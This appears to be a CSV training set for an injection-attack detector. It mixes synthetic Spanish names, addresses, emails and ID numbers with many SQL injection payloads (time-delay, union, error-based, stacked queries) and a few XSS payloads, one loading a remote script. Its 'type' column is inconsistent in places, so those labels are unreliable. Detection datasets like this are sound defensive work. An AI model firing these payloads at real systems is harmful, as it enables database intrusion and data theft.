Text,attack_type,Label,type
"1%') or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('%'='",sqli,1,sql
1';select sleep(5),sqli,1,sql
"1'))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((('zpkv'='zpkv",sqli,1,sql
"(select (case when (4232=4232) then (select benchmark(5000000,md5(0x6b637544))) else 4232*(select 4232 from mysql.db) end))",sqli,1,sql
villanueva de duero,norm,0,normal
1'||(select 'rjis' from dual where 7696=7696 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual))||',sqli,1,sql
47260,norm,0,normal
"c/ ereta, 104,",norm,0,normal
danning-marrow@etxarriaranatz.nr,norm,0,normal
91565705z,norm,0,normal
1' in boolean mode) and 3787=7750--,sqli,1,sql
"1"") as upjw where 3880=3880 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
40320,norm,0,normal
habitadora,norm,0,normal
1'+(select 'yahq' where 6974=6974 union all select null--,sqli,1,sql
techumbre,norm,0,normal
"1"");if(3831=9321) select 3831 else drop function ybru--",sqli,1,sql
s5bal850de,norm,0,normal
"1)) as nwyh where 7100=7100;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"1'));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (('mmvf' like 'mmvf",sqli,1,sql
elefa_n7ina,norm,0,normal
">""<object classid=""clsid:..."" codebase=""javascript:document.cookie=true;"">",xss,2,xss
1')) as plbt where 4368=4368 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,sqli,1,sql
calle cantos negros 150,norm,0,normal
"1' or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and 'vvkl'='vvkl",sqli,1,sql
"1') and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ('vkde'='vkde",sqli,1,sql
5244748375620408,norm,0,normal
9854854946355075,norm,0,normal
1))) and 7533=7533 and (((7740=7740,sqli,1,normal
noelyn,norm,0,normal
"general moscardo 89,",norm,0,normal
"1"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""cuzi"" like ""cuzi",sqli,1,sql
"1' in boolean mode);select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
goldsmith1@esmarbella.ht,norm,0,normal
girabal sabaters,norm,0,normal
1)) union all select null#,sqli,1,sql
1')));select (case when (6166=3364) then 6166 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
8on5fi4a,norm,0,normal
"1"" where 9342=9342 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--",sqli,1,sql
silvino,norm,0,normal
abanear,norm,0,normal
"1"") as lipa where 3450=3450 and make_set(8403=8403,8899)--",sqli,1,sql
1')) or 4240=(select 4240 from pg_sleep(5))--,sqli,1,sql
"calle el pilar s/n,",norm,0,normal
27047841w,norm,0,normal
"calle costa de llevant, 52",norm,0,normal
"-9684"" order by 1#",sqli,1,normal
73361115q,norm,0,normal
valverde,norm,0,normal
22120,norm,0,normal
-8047' or 3038=3038,sqli,1,normal
mag8,norm,0,normal
47494,norm,0,normal
30199081n,norm,0,normal
margheri,norm,0,normal
torrejn de ardoz,norm,0,normal
cendejas de la torre,norm,0,normal
"campa zabala 184,",norm,0,normal
1%'))) union all select null--,sqli,1,sql
"1"" union all select null,null,null,null,null,null,null#",sqli,1,sql
"1,(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (7823=7823) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))",sqli,1,sql
1' and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'iuao'='iuao,sqli,1,sql
ribadumia,norm,0,normal
catatipia,norm,0,normal
"-4993"" union all select 6959,6959,6959--",sqli,1,sql
"1') or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ('cysu' like 'cysu",sqli,1,normal
pangborn@informex.me,norm,0,normal
"1'||(select 'noik' from dual where 9851=9851;iif(5257=5257,1,1/0)",sqli,1,sql
14230,norm,0,normal
ason0nte,norm,0,normal
quartet@cabare.com.cs,norm,0,normal
palau-saverdera,norm,0,normal
"1%"")) and 6969=(select 6969 from pg_sleep(5)) and ((""%""=""",sqli,1,sql
43540,norm,0,normal
8388803635652672,norm,0,normal
"1%"") union all select null--",sqli,1,sql
siete iglesias de trabancos,norm,0,normal
76pelacin,norm,0,normal
dorene6,norm,0,normal
aitor,norm,0,normal
21236992b,norm,0,normal
townie,norm,0,normal
mgi4a,norm,0,normal
8859240955120408,norm,0,normal
corsini-vischer@viajesdacapalla.nl,norm,0,normal
otmar,norm,0,normal
24645898h,norm,0,normal
m*ule38,norm,0,normal
nagyszeder.kehoe@creacionesacampada.es,norm,0,normal
alegra-dulantzi,norm,0,normal
remiendo,norm,0,normal
"1'||(select 'zoqo' from dual where 2063=2063;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
29456732b,norm,0,normal
1')) as cpwx where 5378=5378 rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
02660,norm,0,normal
3363230401310436,norm,0,normal
"1"")) union all select null,null,null,null--",sqli,1,sql
1 and 9198=9198--,sqli,1,sql
terrio@likeanangel.dz,norm,0,normal
"1,(select (case when (5433=5433) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",sqli,1,sql
-5026' or (8459=8459)*4906 and 'uavj' like 'uavj,sqli,1,normal
"calle somontin 154, 3a",norm,0,normal
"c/ inmaculada, 131,",norm,0,normal
1' in boolean mode) and (3020=3020)*6703#,sqli,1,normal
soin,norm,0,normal
"1') where 5378=5378;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",sqli,1,sql
1illabarqu2,norm,0,normal
52181980v,norm,0,normal
1'||(select 'sxya' where 3578=3578;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,sql
"1'||(select 'aoad' where 8795=8795 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))||'",sqli,1,sql
"1""))) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (((""uqyb""=""uqyb",sqli,1,normal
"1'))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('zglq'='zglq",sqli,1,normal
1') as mqxb where 6496=6496 and 7533=7533--,sqli,1,sql
88,norm,0,normal
30718466b,norm,0,normal
"1"";iif(5257=5257,1,1/0)",sqli,1,sql
"1'+(select tdkt where 4535=4535;select benchmark(5000000,md5(0x4c4d6142)))+'",sqli,1,sql
"1) as auly where 4146=4146 or elt(5873=5873,sleep(5))#",sqli,1,normal
"1') and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",sqli,1,sql
muopedro,norm,0,normal
"-9837"" where 7201=7201 union all select 7201,7201,7201--",sqli,1,sql
c/ tajonar 93 2e,norm,0,normal
"1%'))) union all select null,null--",sqli,1,sql
espejn,norm,0,normal
2663409898988215,norm,0,normal
433,norm,0,normal
villaturiel,norm,0,normal
vilagarca de arousa,norm,0,normal
1867101585349432,norm,0,normal
"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",sqli,1,sql
"1%' union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
skedelsk,norm,0,normal
arine,norm,0,normal
1;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,sql
00660335m,norm,0,normal
urbanowi,norm,0,normal
perfeccin,norm,0,normal
"1' or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and 'gkku' like 'gkku",sqli,1,normal
estupian lladonet,norm,0,normal
-4615' or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)),sqli,1,sql
edmundsen@sindns.info,norm,0,normal
-6327')) union all select 2685--,sqli,1,sql
tierra 17,norm,0,normal
c/ guadiana 80 13-a,norm,0,normal
2049,norm,0,normal
"1'||(select 'epjr' from dual where 3074=3074 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,sql
"1%"";select (case when (7019=1998) then 7019 else 7019*(select 7019 from mysql.db) end)#",sqli,1,sql
zurueta olarte,norm,0,normal
holdaway,norm,0,normal
rigas.albalak@albeiteria.it,norm,0,normal
"1) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)",sqli,1,normal
"1) or elt(6272=6272,sleep(5))",sqli,1,normal
"1%"")) and (7817=4371)*4371 and ((""%""=""",sqli,1,normal
1'||(select 'miew' where 8360=8360 waitfor delay '0:0:5')||',sqli,1,sql
reynolds,norm,0,normal
"1%""))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((""%""=""",sqli,1,sql
dagma,norm,0,normal
"patio susi 120,",norm,0,normal
riega girme,norm,0,normal
"-6970"")) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""dyrq"" like ""dyrq",sqli,1,sql
958,norm,0,normal
"1%' and 8407=(select count(*) from generate_series(1,5000000)) and '%'='",sqli,1,sql
fresia,norm,0,normal
"1"") as pydh where 3407=3407 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
1944184387366520,norm,0,normal
"1"") and (3020=3020)*6703 and (""qowc"" like ""qowc",sqli,1,normal
"calle mercurio, 19,",norm,0,normal
segu fustero,norm,0,normal
general ricardos 187,norm,0,normal
42156,norm,0,normal
almera,norm,0,normal
avinguda mas fuster 175 8b,norm,0,normal
mayor,norm,0,normal
"1,(select (case when (8674=7896) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",sqli,1,sql
xerta,norm,0,normal
1%') rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
ondina viejo,norm,0,normal
"1) as ghew where 6441=6441 union all select null,null--",sqli,1,sql
39590,norm,0,normal
5i13r,norm,0,normal
8275,norm,0,normal
bernadet,norm,0,normal
"1') and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ('qbdm'='qbdm",sqli,1,sql
4611888318080805,norm,0,normal
1') as irnj where 7274=7274 and 6969=(select 6969 from pg_sleep(5))--,sqli,1,sql
"calle alegria, 79 9?f",norm,0,normal
"1 and elt(4249=4249,7259)-- meef",sqli,1,sql
"<script a=`>` src=""http://vulnerability-lab.com/crosssitescripting.js""></script>",xss,2,xss
"1'||(select 'dezl' where 8661=8661;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)||'",sqli,1,sql
22234,norm,0,normal
claudine,norm,0,normal
37795,norm,0,normal
"1')) as myws where 5274=5274;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
"1')) as ewyk where 4828=4828 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,1,sql
0949927790340653,norm,0,normal
98946031p,norm,0,normal
"galeno 106, 9?c",norm,0,normal
1')) and sleep(5) and (('tcwt'='tcwt,sqli,1,normal
mullen@menorca.com.bf,norm,0,normal
"1"" where 9792=9792 rlike (select * from (select(sleep(5)))vwyq)#",sqli,1,sql
rosalia,norm,0,normal
1'||(select 'allj' where 7334=7334;begin dbms_lock.sleep(5); end)||',sqli,1,sql
em*barbillada,norm,0,normal
"1)));select count(*) from generate_series(1,5000000)--",sqli,1,sql
siddell,norm,0,normal
desbridar,norm,0,normal
"1')));select benchmark(5000000,md5(0x4c4d6142)) and ((('lijy'='lijy",sqli,1,sql
warde,norm,0,normal
alkire,norm,0,normal
"camino carabineros, 10",norm,0,normal
chelva,norm,0,normal
"calle homero, 127",norm,0,normal
grinnage@programagestionerp.kn,norm,0,normal
"1)) as rwsn where 9946=9946 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",sqli,1,sql
"1'+(select kfmv where 1679=1679;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual)+'",sqli,1,sql
entresurco,norm,0,normal
"-9062"" or 6872=6872 and ""aumq"" like ""aumq",sqli,1,normal
0896066292331731,norm,0,normal
05141,norm,0,normal
18653468p,norm,0,normal
fullum6,norm,0,normal
"1)) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((5507=5507",sqli,1,sql
6,norm,0,normal
singla goicoechea,norm,0,normal
17740,norm,0,normal
"calle diseminado hornos de rey 29, 7?b",norm,0,normal
valdebenito garabana,norm,0,normal
"calle ladera, 147 10-e",norm,0,normal
1112,norm,0,normal
franey_travers@hayunmundoahifuera.br,norm,0,normal
"1 where 2301=2301;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
"1"")) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((""gxqq""=""gxqq",sqli,1,sql
-5820')) as lkik where 4044=4044 or 7156=9197--,sqli,1,sql
rattray@elgrancolisionadordehadrones.gl,norm,0,normal
00090113e,norm,0,normal
"-4588"" union all select 4550,4550,4550,4550#",sqli,1,sql
4608056297024601,norm,0,normal
champ,norm,0,normal
"1"") as tecq where 4817=4817 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
8869503887772031,norm,0,normal
guciz,norm,0,normal
tinto higueras,norm,0,normal
atigrada,norm,0,normal
rigoberta menchu 184 10?d,norm,0,normal
bourget,norm,0,normal
velejar,norm,0,normal
1')) as dcen where 5852=5852 or (select * from (select(sleep(5)))ydpu)--,sqli,1,sql
guerette,norm,0,normal
84996241v,norm,0,normal
1) rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
"1') as mpsf where 3348=3348;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
"-7559"" or 8792=6905--",sqli,1,sql
37115,norm,0,normal
"c/ palomar, 44,",norm,0,normal
"-4653' or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
"<a href=""http://www.google.com"">crosssitescripting</a>",xss,2,normal
"pl. francisca pacheco, 81",norm,0,normal
"travesia brieva, 171,",norm,0,normal
26527823z,norm,0,normal
ejarque barbieri,norm,0,normal
"1%')));select count(*) from generate_series(1,5000000) and ((('%'='",sqli,1,sql
fortet esquer,norm,0,normal
artigas girut,norm,0,normal
"1"")) as xwrq where 4161=4161;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
roe,norm,0,normal
c/ caos del peral 147,norm,0,normal
"1%""))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (((""%""=""",sqli,1,sql
plommer8@artesania.org.sj,norm,0,normal
talavera,norm,0,normal
1429,norm,0,normal
ma$c3donio,norm,0,normal
"1,(select (case when (3888=3888) then (select count(*) from generate_series(1,5000000)) else 1/(select 0) end))",sqli,1,sql
"c/ benimaclet, 46",norm,0,normal
3368084974828178,norm,0,normal
18340,norm,0,normal
trafelati zurera,norm,0,normal
ceg.ama,norm,0,normal
"1) as iupg where 2861=2861 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
"-8419) where 8692=8692 union all select 8692,8692,8692--",sqli,1,sql
qerimi@graficascamp.bt,norm,0,normal
mauricio,norm,0,normal
7385369805939657,norm,0,normal
33455,norm,0,normal
c1ir4ia4e5a,norm,0,normal
minton.mauban@salaparis.cat,norm,0,normal
knight_freihart@tresbrujas.qa,norm,0,normal
54011879j,norm,0,normal
"1"");select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",sqli,1,sql
"jose maria mortes lerma, 151 11-d",norm,0,normal
10155328t,norm,0,normal
leobaldo,norm,0,normal
"1""))) union all select null,null,null,null,null,null,null#",sqli,1,sql
abdul,norm,0,normal
"calle morse, 17",norm,0,normal
streit bellavista,norm,0,normal
"1"") where 2215=2215 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",sqli,1,sql
ilva,norm,0,normal
zelmiro,norm,0,normal
1 waitfor delay '0:0:5'--,sqli,1,sql
28817883x,norm,0,normal
nobutaka,norm,0,normal
villanueva del conde,norm,0,normal
"c/ los escribanos 98,",norm,0,normal
jailyn,norm,0,normal
valle de mena,norm,0,normal
bellcaire d'empord,norm,0,normal
40560,norm,0,normal
1) as bozx where 2160=2160 and sleep(5)#,sqli,1,normal
"1"")) union all select null,null--",sqli,1,sql
"<base href=""javascript:alert('crosssitescripting');//"">",xss,2,xss
"1'+(select 'rajp' where 3300=3300;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
9903rti37,norm,0,normal
nicols,norm,0,normal
46909856e,norm,0,normal
45256,norm,0,normal
"1"") as eaxo where 2728=2728;waitfor delay '0:0:5'--",sqli,1,sql
eddier,norm,0,normal
estafetil,norm,0,normal
"1') or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('cqrp'='cqrp",sqli,1,sql
"c/ don bosco 65, 10-d",norm,0,normal
"1',(select (case when (5217=5217) then 1 else 5217*(select 5217 from mysql.db) end))",sqli,1,sql
producti8,norm,0,normal
"1%')));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
57978068j,norm,0,normal
gillespi,norm,0,normal
cohn.of@evasor.ch,norm,0,normal
1423739556079004,norm,0,normal
"-1152%') or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('%'='",sqli,1,sql
sols galcera,norm,0,normal
"1')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((('juhi' like 'juhi",sqli,1,sql
vindicacin,norm,0,normal
excusana,norm,0,normal
exte69a1i29,norm,0,normal
"-5776%' union all select 3075,3075,3075,3075,3075--",sqli,1,sql
"1 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",sqli,1,sql
05520,norm,0,normal
calle bernat metge 10,norm,0,normal
4089,norm,0,normal
"1"")) as qrrx where 4633=4633 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
jaguin-woodridge@cristinaleon.si,norm,0,normal
amontona+r,norm,0,normal
2008,norm,0,normal
brasfield@elcarritodelacompra.hk,norm,0,normal
"callejon pavaneras, 69 6?b",norm,0,normal
3j,norm,0,normal
54415049q,norm,0,normal
28815,norm,0,normal
"-6642') where 3459=3459 union all select 3459,3459,3459,3459,3459,3459,3459,3459,3459#",sqli,1,sql
"1%"")) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
quinds parini,norm,0,normal
jou de lagarza,norm,0,normal
"1%')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('%'='",sqli,1,sql
41022572w,norm,0,normal
1' or 6793=(select 6793 from pg_sleep(5)) and 'dogx'='dogx,sqli,1,sql
92439025r,norm,0,normal
"1"" or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
32788800t,norm,0,normal
8632,norm,0,normal
17889538t,norm,0,normal
asertivamente,norm,0,normal
"-4905"" union all select 6082,6082--",sqli,1,sql
hana,norm,0,normal
-8080')) order by 1#,sqli,1,normal
oman,norm,0,normal
"1'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (('wusq'='wusq",sqli,1,sql
8749462900315765,norm,0,normal
-2452'))) union all select 1951--,sqli,1,sql
glyn7,norm,0,normal
"1) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))",sqli,1,normal
peligros,norm,0,normal
4466581069575566,norm,0,normal
"c/ alcorac, 102",norm,0,normal
9797161679933006,norm,0,normal
"1' in boolean mode) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)#",sqli,1,sql
"camino ermita de la torre, 129,",norm,0,normal
chojnacka@enibiza.com.ec,norm,0,normal
kilbank,norm,0,normal
"1""))) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (((""jgoq""=""jgoq",sqli,1,sql
"duesaigues 80,",norm,0,normal
pingshen,norm,0,normal
fergusso,norm,0,normal
1;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
"1"") as uuth where 8555=8555 union all select null,null#",sqli,1,sql
71319387k,norm,0,normal
"-9630%"" union all select 8592,8592,8592,8592--",sqli,1,sql
ourense,norm,0,normal
"-1050"")) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""orfo"" like ""orfo",sqli,1,sql
mico puig,norm,0,normal
"1"" procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ""ikhr""=""ikhr",sqli,1,normal
danisa,norm,0,normal
"1"") where 7957=7957 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
-6233') where 9820=9820 or 3038=3038,sqli,1,normal
"1',(select (case when (6894=6087) then 1 else 6894*(select 6894 from information_schema.character_sets) end))",sqli,1,sql
08930,norm,0,normal
"1%"")) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((""%""=""",sqli,1,sql
6749,norm,0,normal
-2604)) as sekb where 6897=6897 or 1000=7683,sqli,1,normal
escal,norm,0,normal
3090147546194865,norm,0,normal
boothe,norm,0,normal
172,norm,0,normal
kirk,norm,0,normal
1');select pg_sleep(5) and ('aydg'='aydg,sqli,1,sql
goodman4,norm,0,normal
"1'+(select ocvc where 6981=6981 union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
"-8425"")) or (6485=1127)*1127 and ((""qruf""=""qruf",sqli,1,normal
"1"")) or 6793=(select 6793 from pg_sleep(5)) and ((""ejpw""=""ejpw",sqli,1,sql
"-6514)) as pbgg where 6841=6841 union all select 6841,6841,6841,6841--",sqli,1,sql
"1%' and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
moon,norm,0,normal
"jose gomez gallito, 107,",norm,0,normal
1618,norm,0,normal
1' where 1623=1623;select (case when (4393=2875) then 1 else 4393*(select 4393 from master..sysdatabases) end)--,sqli,1,sql
"1')) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
hoek,norm,0,normal
calle montes claros 9,norm,0,normal
8e3i2ar,norm,0,normal
-7444))) or 1342=9774,sqli,1,normal
marielle,norm,0,normal
"-1425"") where 8056=8056 or elt(1032=1032,3623)--",sqli,1,sql
"1"") and 2006=2006",sqli,1,normal
"1))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (((7813=7813",sqli,1,sql
"1%"")));select (case when (8857=1512) then 8857 else 8857*(select 8857 from mysql.db) end)#",sqli,1,sql
c632i6ela,norm,0,normal
05480,norm,0,normal
fest lairigoyen,norm,0,normal
tobin,norm,0,normal
adam,norm,0,normal
"1' in boolean mode) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)#",sqli,1,sql
m01rosa,norm,0,normal
"1))) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
1 and (3020=3020)*6703# syuj,sqli,1,normal
-8465' where 5242=5242 or 3806=7423--,sqli,1,sql
"1%"") or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (""%""=""",sqli,1,sql
chan+quete,norm,0,normal
"-2256""))) or 1971=4537#",sqli,1,normal
"1);select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (8535=8535",sqli,1,sql
8121,norm,0,normal
"1'||(select 'kgjk' where 3530=3530 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
"1%""))) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
"-6123"" or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ""zuzx""=""zuzx",sqli,1,sql
24530,norm,0,normal
drake3,norm,0,normal
"c/ irmans carro s/n,",norm,0,normal
94721255x,norm,0,normal
11,norm,0,normal
"-2460%"") or (2660=5767)*5767 and (""%""=""",sqli,1,normal
longo,norm,0,normal
sheng-passanante@ankawaelda.int,norm,0,normal
veh327lo,norm,0,normal
1) where 2170=2170;select sleep(5)--,sqli,1,sql
"calle florian de ocampo 114, 7?h",norm,0,normal
nikolia,norm,0,normal
"1%""))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (((""%""=""",sqli,1,sql
letra bala,norm,0,normal
01548,norm,0,normal
tie3t54,norm,0,normal
419747iv6,norm,0,normal
